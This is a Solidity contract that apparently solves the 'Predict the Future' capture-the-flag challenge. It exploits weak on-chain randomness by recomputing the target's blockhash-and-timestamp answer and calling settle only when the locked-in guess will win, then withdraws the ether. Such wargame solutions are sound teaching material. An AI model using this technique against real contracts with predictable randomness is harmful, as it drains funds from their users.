// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

// 0xdf00bd03dc886ab65B1d208aB5adb3D40dAb2C63

interface IPredictTheFutureChallenge {
       function settle() external;
       function lockInGuess(uint8 n) external payable;
}

contract PredictTheFutureChallengeSolver {
    address owner;
    uint8 guess;
    uint256 settlementBlockNumber;
    IPredictTheFutureChallenge challenge;

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = IPredictTheFutureChallenge(_challenge);
    }

    function lockInGuess(uint8 n) external payable onlyOwner {
        guess = n;
        settlementBlockNumber = block.number + 1;

        challenge.lockInGuess{value:msg.value}(n);
    }

    function try_settle() external onlyOwner {
        require(block.number > settlementBlockNumber, "Too early");

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == guess, "Answer is not correct yet");

        challenge.settle();
    }

    function settle() external onlyOwner {
        challenge.settle();
    }

    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}